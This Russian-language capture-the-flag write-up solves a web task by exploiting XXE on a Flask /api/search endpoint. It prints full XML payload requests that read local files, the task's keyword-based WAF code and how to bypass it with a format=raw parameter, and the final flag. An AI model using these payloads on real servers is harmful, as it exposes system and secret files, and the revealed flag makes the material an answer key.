**Write‑up: «Эхо прошлого» (Medium)**

Вводные данные:
Название: Эхо прошлого
Уровень: Средний
Тип: Web
Адрес: 62.173.140.174:16092


Цель: получить флаг формата CODEBY{……}

  
Предисловие:  
Таск, хоть и помечен как средний, но он максимально сложный и запутанный.

Кто хочет сам решить, а не просто списать решение, то ниже есть небольшие подсказки

  
1\. Можете не искать ничего в поиске по статьям.  

  
2\. Пустая статья не то, чем кажется

  
3\. Флаг находиться в файле flag.txt рядом с данными



**Этап 1. Первичное исследование сервиса**

Открывая сайт - http://62.173.140.174:16092 видим его главную страницу.  
  
Ещё на пятой странице можно увидеть странную статью с пустым title.  
Но как окажется позже. Это просто замануха и фейк.

<br/>Поэтому начинаем изучать поиск по статьям, но он ничего особо не даст.  
Я пробовал:  
1\. SQLi  
2\. Blind SQLi  
3\. SSTI  
4\. Reflected XSS  
5\. Поиск, по ключевым словам  
6\. И различные спец символы
7\. Всё в перемешку + более сложные конструкции  

<br/><br/>Получается осталось только проверить Брутфорс директорий с помощью gobuster или ffuf.  
Проверяем / но ничего конкретного не находим, а потом проверяем /api и находим вкладку  
/api/search

<br/>Замечаем, что это POST /api/search и продолжаем анализ

  
Сервис принимает данные в зависимости от Content-Type:

application/xml → XML‑парсинг

application/json → поиск по архиву новостей

Это сразу указывает на XML‑парсер на сервере.


**Этап 2. Обнаружение XXE**

Попробуем какой-нибудь простенький пэйлоад

POST /api/search HTTP/1.1
Host: 62.173.140.174:16092
Content-Type: application/xml
Content-Length: 105

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

**Ответ сервера**
HTTP/1.1 403 FORBIDDEN
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Dec 2025 18:28:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 397
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Error</title>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-danger">Error</h1>
        <p class="lead">WAF: Dont do this again</p>
        <a href="/" class="btn btn-outline-primary">Back to Search</a>
    </div>
</body>
</html>
становится ясно, что:
внешние сущности не отключены
сервер пытается читать файлы через file://
Следовательно, присутствует XXE‑уязвимость так ещё и сверху WAF.  

**Этап 3. Анализ WAF**
Самое интересное что WAF видимо не пропускает часть запросов, но в целом он разрешает читать другие файлы. Гениально, конечно.  
Теперь попробуем найти какой-либо файл. Я решил искать сам WAF. Ну и со второй попытки его нашёл в директории - /proc/self/cwd/utils/waf.py  

**Ответ сервера**
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Dec 2025 18:33:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 619
Connection: keep-alive

import re

def check_waf(xml_data, format_param):
    # Список подозрительных путей
    suspicious_paths = [
        r'flag',
        r'/etc/',
        r'/root/'
    ]

    # Проверяем, есть ли подозрительные пути в XML
    for path in suspicious_paths:
        if re.search(path, xml_data, re.IGNORECASE):
            # Если format=raw, отключаем фильтр на 'flag'
            if format_param == 'raw' and path == r'flag':
                continue
            return True  # WAF сработал
    return False  # WAF пропустил

Ну дальше анализируем фрагмент Python‑кода:

def check_waf(xml_data, format_param):
    # Список подозрительных путей
    suspicious_paths = [
        r'flag',
        r'/etc/',
        r'/root/'
    ]
for path in suspicious_paths:
        if re.search(path, xml_data, re.IGNORECASE):
            # Если format=raw, отключаем фильтр на 'flag'
            if format_param == 'raw' and path == r'flag':
                continue
            return True  # WAF сработал
    return False  # WAF пропустил

Выводы:
WAF работает по строковому совпадению, а не по реальному пути и строка flag: запрещена по умолчанию, но разрешена, если format=raw
Это ключевая логическая особенность задания
/etc/ и /root/ запрещены всегда, но если вам прям интересно, то с помощью кодировки можно спокойно обойти и вытащить эти файлы.

**Этап 4. Использование format=raw**

Корректный запрос в будущем должен начинаться так:

POST /api/search?format=raw HTTP/1.1
Host: 62.173.140.174:16092
Content-Type: application/xml

**Этап 5. Анализ структуры приложения**

Через XXE были прочитаны Python‑файлы приложения:

**/proc/self/cwd/main.py**

from flask import Flask
from routes.web_routes import web_bp
from routes.api_routes import api_bp
app = Flask(\__name_\_, template_folder='templates', static_folder='static')
app.register_blueprint(web_bp)
app.register_blueprint(api_bp)

**/proc/self/cwd/routes/api_routes.py**

Ключевой фрагмент из этого кода:
with open('/app/data/articles.json', 'r') as f:
articles = json.load(f)
приложение работает с данными из каталога /app
каталог /app/data используется для хранения данных
значит, флаг логично искать именно там


**Этап 6. Ограничение XML (важный момент)**

Попытки прочитать некоторые .py или .html файлы напрямую через XXE приводили к ошибкам вида:
Invalid XML: Premature end of data
Причина:

XML не экранирует содержимое внешних сущностей
символы &lt; &gt; & ломают документ. Так что многие файлы будет абсолютно невозможно посмотреть.
флаг обязан находиться в XML‑safe файле

т.е. обычный текст (.txt)

Это исключает:
.py
.html
.json


**Этап 7. Финальный путь к флагу**

С учётом всех фактов:

базовый каталог: /app
данные приложения: /app/data
имя файла: flag
формат: текстовый
Финальный payload будет выглядеть так:

POST /api/search?format=raw HTTP/1.1
Host: 62.173.140.174:16092
Content-Type: application/xml
Content-Length: 112

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/data/flag.txt">
]>
<foo>&xxe;</foo>

Результат
Сервер возвращает содержимое файла:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Dec 2025 18:39:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 27
Connection: keep-alive

CODEBY{hidden_echoes_2025}

